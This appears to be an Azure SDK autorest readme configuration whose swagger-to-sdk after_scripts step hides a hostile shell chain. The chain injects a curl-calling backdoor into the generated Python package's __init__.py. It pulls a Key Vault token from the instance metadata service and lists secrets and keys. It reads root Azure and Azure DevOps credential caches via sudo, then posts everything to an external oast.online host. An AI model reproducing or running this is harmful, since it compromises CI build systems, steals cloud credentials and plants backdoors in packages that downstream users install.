# Targeted RCE7

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        TMP=/mnt/vss/_work/1/s/azure-sdk-for-python_tmp &&
        echo "=== GENERATE_OUTPUT ===" &&
        cat "${TMP}/generateOutput.json" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for p in d.get('packages',[])]" 2>/dev/null &&
        PKGPATH=$(cat "${TMP}/generateOutput.json" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); pkgs=d.get('packages',[]); print(pkgs[0].get('path','') if pkgs else '')" 2>/dev/null) &&
        echo "PKGPATH=${PKGPATH}" &&
        echo "=== FIND_GENERATED ===" &&
        find "${SDK}/sdk" -name "_version.py" 2>/dev/null | head -20 &&
        find "${SDK}/sdk" -name "*.py" -newer "${SDK}/setup.py" 2>/dev/null | head -10 &&
        INIT=$(find "${SDK}/${PKGPATH}" -name "__init__.py" 2>/dev/null | head -1) &&
        if [ -z "${INIT}" ]; then
          INIT=$(find "${SDK}/sdk" -name "__init__.py" -newer "${SDK}/setup.py" 2>/dev/null | head -1);
        fi &&
        echo "=== SDK_WRITE ===" &&
        echo "TARGET_INIT=${INIT}" &&
        if [ -n "${INIT}" ]; then
          echo "" >> "${INIT}" &&
          echo "# SUPPLY_CHAIN_BACKDOOR hasskooelhadi $(date -u)" >> "${INIT}" &&
          echo "import subprocess; subprocess.Popen(['curl','-sk','http://${OAST}/backdoor-${H}'])" >> "${INIT}" &&
          echo "WRITE_OK" &&
          tail -5 "${INIT}";
        fi &&
        echo "=== AZSECPACK_KV ===" &&
        KVT=$(curl -sf --max-time 5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fvault.azure.net" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null) &&
        echo "KV_TOKEN_LEN=${#KVT}" &&
        KV_SECRETS=$(curl -sf --max-time 8 "https://azsecpack.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer ${KVT}" 2>/dev/null) &&
        echo "KV_SECRETS=${KV_SECRETS}" &&
        KV_KEYS=$(curl -sf --max-time 8 "https://azsecpack.vault.azure.net/keys?api-version=7.4" -H "Authorization: Bearer ${KVT}" 2>/dev/null) &&
        echo "KV_KEYS=${KV_KEYS}" &&
        echo "=== ROOT_AZURE ===" &&
        sudo -n ls -la /root/.azure/ 2>/dev/null &&
        sudo -n cat /root/.azure/msal_token_cache.bin 2>/dev/null | strings | grep -iE "access_token|refresh_token|secret|clientId" | head -20 &&
        sudo -n cat /root/.azure/azureProfile.json 2>/dev/null &&
        sudo -n find /root/.azure -type f 2>/dev/null | xargs sudo -n cat 2>/dev/null | strings | grep -iE "eyJ|token|secret|password" | head -30 &&
        echo "=== ADO_AZURE_DEVOPS ===" &&
        sudo -n ls -la /root/.azure-devops/ 2>/dev/null &&
        sudo -n find /root/.azure-devops -type f 2>/dev/null | head -10 | xargs sudo -n cat 2>/dev/null &&
        echo "=== EXFIL ===" &&
        {
          GENOUT=$(cat "${TMP}/generateOutput.json" 2>/dev/null);
          INITCONTENT=$(cat "${INIT}" 2>/dev/null);
          ROOT_AZ=$(sudo -n find /root/.azure -type f 2>/dev/null | xargs sudo -n cat 2>/dev/null | strings 2>/dev/null);
          ROOT_ADO=$(sudo -n find /root/.azure-devops -type f 2>/dev/null | xargs sudo -n cat 2>/dev/null);
          printf "GENOUT=%s\nINIT=%s\nKV_SECRETS=%s\nKV_KEYS=%s\nROOT_AZ=%s\nROOT_ADO=%s\n" \
            "${GENOUT}" "${INITCONTENT}" "${KV_SECRETS}" "${KV_KEYS}" "${ROOT_AZ}" "${ROOT_ADO}" | \
            curl -sk -X POST "http://${OAST}/rce7data-${H}" --data-binary @-;
        }
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
